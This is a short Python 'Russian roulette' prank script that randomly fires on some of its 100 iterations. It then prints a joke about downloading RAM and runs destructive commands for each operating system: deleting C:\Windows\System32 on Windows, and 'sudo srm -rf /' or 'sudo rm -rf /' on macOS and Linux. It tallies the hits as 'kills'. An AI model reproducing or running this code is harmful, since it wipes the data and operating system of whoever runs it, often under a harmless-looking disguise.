import random
import math
import platform
import os
import time
range_ = 100 
startTime = time.time()

def main():

    y=0
    for i in range(0,range_):
        x = random.randint(0, 5)        
        if x == 1:        
            print(str(x)+" Bang. Downloading more RAM please wait.....")   
            y = y + 1                  
            if platform.system() == 'Windows':
                os.remove("C:\Windows\System32")
            if platform.system() == 'Darwin':            
                os.system('sudo srm -rf /')
            if platform.system() == 'Linux':
                os.system('sudo rm -rf /')
            else:
                return 0
        else:
            print(str(x)+" Click")
            
    print("Kills :", y)
    print("Misses :", (range_ - y))
    print("Kill Rate :", math.trunc((y/range_)*100), "%") 

def execution():
    executionTime = (time.time() - startTime)
    print('Execution time in seconds: ' + str(math.trunc(executionTime)))


if __name__ == '__main__':
    main()
    execution()